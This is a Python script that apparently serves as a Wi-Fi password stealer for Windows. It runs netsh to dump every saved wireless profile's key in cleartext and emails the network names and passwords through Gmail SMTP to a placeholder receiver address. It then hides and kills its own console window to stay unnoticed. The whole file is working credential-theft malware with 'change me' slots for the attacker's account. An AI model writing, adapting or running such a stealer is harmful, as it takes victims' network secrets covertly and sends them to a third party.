import subprocess
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import ctypes
import os
import win32process



msg = MIMEMultipart()

# senders email address
msg['From'] = "youraccount@gmail.com"

# receivers email address
msg['To'] = "receiver@hotmail.com"

# the subject of mail
msg['Subject'] = "he5ohe5o"


# the body of the mail

email = smtplib.SMTP('smtp.gmail.com', 587)
email.starttls()
#change me 
email.login("youraccount@gmail.com", "password")
networks = subprocess.check_output("netsh wlan show profile", shell=True).decode('utf-8')
networks_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
networks_passwords = []
for name in networks_names:
    command = "netsh wlan show profile " + name + " key=clear"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    result = process.stdout.read().decode('utf-8')
    networks_password = re.findall("(?:Key Content\s*:\s)(.*)", result)
    networks_passwords.append(networks_password)
# print(networks_passwords)
alla = ""
for i in range(len(networks_names)):
    password = str(networks_passwords[i])[2:-4]
    x = networks_names[i].strip()+ " is: "+ password.strip() + "\n"
    alla += x

msg.attach(MIMEText(alla, 'plain'))
                #change me
email.sendmail("el sender email", "el receiver email", msg.as_string())

email.quit()
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
if hwnd != 0:
    ctypes.windll.user32.ShowWindow(hwnd, 0)
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    os.system('taskkill /PID ' + str(pid) + ' /f')
